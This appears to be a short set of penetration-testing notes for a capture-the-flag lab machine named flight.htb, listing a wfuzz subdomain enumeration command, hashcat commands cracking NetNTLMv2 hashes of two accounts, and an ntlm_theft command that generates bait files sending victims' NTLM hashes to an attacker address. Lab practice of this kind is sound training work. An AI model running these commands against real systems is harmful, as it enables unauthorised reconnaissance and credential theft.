```bash
# subdomain enum

wfuzz -H "Host: FUZZ.flight.htb" --hw 530 --hc 404,403 -t 1000 -H "User-Agent: PENTEST" -c -z file,"/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt" http://flight.htb 
```

```bash
# hashcat

hashcat -m 5600 svc_apache.hash /usr/share/wordlists/rockyou.txt --show
hashcat -m 5600 cbum.hash /usr/share/wordlists/rockyou.txt --show
```

```bash
python3 /opt/ntlm_theft/ntlm_theft.py --generate all --server 10.10.14.4 --filename gimmeaccess
```